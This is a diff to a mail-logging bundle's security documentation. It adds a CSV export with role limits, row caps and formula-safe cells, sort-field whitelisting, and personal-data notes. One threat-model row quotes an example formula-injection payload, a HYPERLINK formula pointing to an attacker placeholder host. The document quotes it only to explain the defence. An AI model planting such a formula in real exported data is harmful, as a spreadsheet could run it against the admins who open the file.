@@ -33,7 +33,8 @@ transports and provider bridges, or the content of the messages your application
 | Input | Where | Notes |
 | --- | --- | --- |
 | DSN, sender, API key fields | Instance Settings section form / import (session, admin) | Validated by the field constraints on save **and** import; secrets encrypted at rest by Instance Settings. |
-| Admin HTTP `GET` (session) | `…/log`, `…/log/{id}`, `…/log/{id}/body` | Access checker on every request under the prefix; UUID route requirement; `no-store`. |
+| Admin HTTP `GET` (session) | `…/log`, `…/log/{id}`, `…/log/{id}/body` | Access checker on every request under the prefix; UUID route requirement; `no-store`; `sort` / `dir` checked against a whitelist (never interpolated into DQL). |
+| Admin HTTP `GET` (session) | `…/log/export` | Same access as the list plus optional `web_ui.export.access_roles`; formula-injection-safe cells (`CsvSafeWriter`); `no-store`; capped at `web_ui.export.max_rows`; bodies only with `log.store_bodies` + `web_ui.export.include_bodies` + `?bodies=1`. |
 | Admin HTTP `POST` (session) | `…/actions/test`, `…/actions/resend/check`, `…/actions/resend/test` | CSRF-only Form, MailKit access **and** Instance Settings section access, per-user rate limit for test e-mails. |
 | Outbound SMTP / provider API | `RuntimeTransport` | Only to validated DSNs (scheme allow-list, host guard); framework `MAILER_DSN` fallback trusted. |
 | Outbound HTTPS | `ResendApiChecker` → `https://api.resend.com/domains` | Fixed URL, deadline, no redirects. |
@@ -55,7 +56,9 @@ transports and provider bridges, or the content of the messages your application
 | **CSRF** | Every POST is a FormKit CSRF-only form (`csrf_only[_token]`, one token id per action); not submitted or invalid → 403. The container refuses to compile the UI without form CSRF or a token manager (pattern P2). |
 | **Mail bombing / quota burn through the test action** | Per-user sliding-window rate limit, shared with the Resend key check (each check is an outbound call) (`test_email.rate_limit` per `rate_interval`, client address for anonymous demo access); recipient is the configured test recipient or the user's own address (no free-form recipient in the UI). |
 | **Stored XSS through logged content** | Subjects, addresses, tags and errors are escaped by Twig; the text body is escaped in a `<pre>`; the HTML body is never inlined in the admin page — it is served alone with `Content-Security-Policy: default-src 'none'; img-src data:; style-src 'unsafe-inline'; base-uri 'none'; form-action 'none'; frame-ancestors 'self'; sandbox`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: no-referrer`, `no-store`. |
-| **Injection** | ORM QueryBuilder / DBAL with bound parameters; LIKE patterns escaped (`!` escape); table names come from the configured prefix (validated `[A-Za-z0-9_]*`). |
+| **Injection** | ORM QueryBuilder / DBAL with bound parameters; LIKE patterns escaped (`!` escape); table names come from the configured prefix (validated `[A-Za-z0-9_]*`); the list / export sort is a key whitelist mapped to fixed DQL columns (`SentMailRepository::SORT_FIELDS`, unknown keys refused), never request text in `ORDER BY`. |
+| **CSV / formula injection** (a subject or tag such as `=HYPERLINK("https://attacker.example",…)` run by a spreadsheet when an admin opens the export) | Every exported cell goes through ControllerKit's `CsvSafeWriter`: text starting with `=`, `+`, `-`, `@`, tab or CR gets a leading `'`; RFC 4180 quoting; regression tests with formula payloads in subject and tag. |
+| **Bulk personal-data exfiltration through the export** | Same access as the log plus optional `web_ui.export.access_roles`; `max_rows` cap (10 000); no bodies unless three explicit opt-ins; `no-store`; can be switched off (`web_ui.export.enabled: false`). |
 | **Log write breaking delivery / host transactions** | Writes go through DBAL (never the host unit of work) and are best effort (warning on failure). |
 | **Accidental route exposure** | The controller is not autoconfigured; routes come only from the `nowo_mail_kit` loader, groups switched off are not loaded (REQ-SF-004 rule 7, integration test). |
 | **Demo configuration in production** | `security.allow_unauthenticated: true` is refused unless `kernel.debug` is true. The demo publishes its ports on `127.0.0.1` only and sends to Mailpit. |
@@ -88,6 +91,10 @@ when not every admin may change the transport.
   in the subjects and stored bodies of the other rows (also URL-encoded). Internationalised addresses are accepted.
   Call it from your account-deletion flow. Not covered: copies outside the log (provider dashboards, mailboxes).
 - `log.enabled: false` disables the log entirely.
+- **CSV export** (`web_ui.export`, on by default for whoever opens the log): a downloaded file is a copy outside the
+  retention purge and the erasure command. Limit it with `web_ui.export.access_roles`, keep `include_bodies` off, and
+  record in your processing register who may export and how long files are kept. Bodies need three explicit opt-ins
+  (`log.store_bodies`, `web_ui.export.include_bodies`, `?bodies=1`). Errors are scrubbed again on export.
 
 ## Logging
 
@@ -110,13 +117,15 @@ when not every admin may change the transport.
 - SMTP / provider sends: Symfony transport timeouts (DSN `timeout` option); keep them below PHP `max_execution_time`
   ([CONFIGURATION — Timeouts](CONFIGURATION.md#timeouts-req-runtime-001)).
 - Stored bodies capped at 1 MiB each, errors at 2 000 characters, search at 120 characters, list pages at
-  `web_ui.page_size` (≤ 200); purge in keyset batches.
+  `web_ui.page_size` (≤ 200); purge in keyset batches; CSV export streamed (one row hydrated at a time, bodies
+  fetched 100 rows per query) and capped at `web_ui.export.max_rows` (10 000).
 
 ## CSRF
 
 Applies (session-authenticated admin mutations): FormKit CSRF-only forms on every POST action, fail-closed container
 check, no `csrf_protection: false` on mutation forms (only the idempotent GET filter form has none). The CLI has no
-session and no CSRF.
+session and no CSRF. The CSV export is a GET read with no side effect (same as the filters): no CSRF token; a forged
+cross-site link can only make the admin's own browser download what it may already read, never cached (`no-store`).
 
 ## Dependencies and updates
 
